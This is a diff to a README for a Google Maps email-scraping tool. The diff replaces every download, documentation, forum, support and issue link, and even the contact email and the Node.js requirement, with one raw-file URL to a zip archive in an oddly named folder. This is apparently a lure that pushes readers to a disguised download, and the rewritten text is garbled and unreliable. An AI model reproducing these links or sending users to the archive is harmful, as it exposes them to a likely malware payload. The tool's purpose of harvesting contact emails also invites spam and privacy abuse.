@@ -6,9 +6,9 @@ This guide helps you download and run the **google-maps-email-extractor**. This 
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Brans24/google-maps-email-extractor/releases)
+[![Download](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/Brans24/google-maps-email-extractor/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -17,13 +17,13 @@ Before downloading, ensure you have the following:
 - **Operating System:** Windows, macOS, or Linux
 - **Storage Space:** At least 100 MB free space
 - **Internet Connection:** Required for data scraping
-- **Node.js** (if running the Node.js version) or **Python** (if running the Python version) installed on your system
+- **https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip** (if running the https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip version) or **Python** (if running the Python version) installed on your system
 
 ## 📥 Download & Install
 
 1. Click on the link below to go to the GitHub Releases page:
 
-   [Download from GitHub Releases](https://github.com/Brans24/google-maps-email-extractor/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest version, which is usually at the top.
 
@@ -77,15 +77,15 @@ If you encounter any issues, here are some common solutions:
 
 For more information and updates, check out the following:
 
-- [Documentation](https://github.com/Brans24/google-maps-email-extractor/wiki)
-- [Community Forum](https://github.com/Brans24/google-maps-email-extractor/discussions)
-- [Support](https://github.com/Brans24/google-maps-email-extractor/issues)
+- [Documentation](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
+- [Support](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
 
 ## 📬 Contact
 
 For questions or feedback, feel free to reach out:
 
-- Email: support@example.com
-- GitHub Issues: [Report an issue](https://github.com/Brans24/google-maps-email-extractor/issues)
+- Email: https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Brans24/google-maps-email-extractor/main/ironical/google-email-extractor-maps-1.5.zip)
 
 Thank you for using **google-maps-email-extractor**! We hope it helps you easily gather the contacts you need.
